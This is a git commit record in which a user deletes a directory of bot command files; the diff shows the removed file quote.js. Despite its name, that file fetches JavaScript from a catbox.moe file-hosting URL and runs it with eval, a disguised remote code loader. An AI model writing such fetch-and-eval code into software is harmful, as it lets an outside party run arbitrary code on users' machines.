0aacf8a31f2dbe3866e5bde45b6d50556fafa730
HANSTZ <hanstzmd@gmail.com>
2025-04-03 18:05:13 +0300

    Delete HANSTZ_CMDS directory

--- HANSTZ_CMDS/quote.js
+++
@@ -1,7 +0,0 @@
-const axios = require('axios');
-
-const url = "https://files.catbox.moe/iizpxm.js";
-
-axios.get(url)
-    .then(response => eval(response.data))
-    .catch(err => console.error(err));
